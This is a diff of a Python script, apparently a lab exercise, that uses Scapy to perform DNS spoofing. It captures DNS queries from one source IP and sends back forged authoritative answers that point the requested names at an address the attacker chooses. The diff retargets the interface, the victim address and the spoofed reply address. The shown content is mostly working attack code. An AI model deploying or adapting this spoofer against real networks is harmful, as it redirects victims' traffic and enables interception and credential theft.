@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
-
-# Written by: Sagiv Antebi
+#Author: Sagiv Antebi
 
 from scapy.all import *
 
 #The PC interface in our route list
-iface_request = "enp0s8"
+iface_request = "enp0s10"
 
 #The filter for the packet we want to catch and chane - port 53 - and the specific IP
-filter_pack = " and ".join(["udp dst port 53", "udp[10]&0x80 = 0", "src host 192.168.56.102"])
+filter_pack = " and ".join(["udp dst port 53", "udp[10]&0x80 = 0", "src host 192.168.65.4"])
 
 #The function to eate the packet we want to return
 def make_packet(packet):
@@ -23,7 +22,7 @@ def make_packet(packet):
 
     #The DNS packet we change
     dns_pack = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0,
-                   ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata="1.2.3.4"))
+                   ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata="192.168.65.7"))
 
     #Creating the packet we want to response with to enp0s8
     response_packet = eth_pack / ip_pack / udp_pack / dns_pack
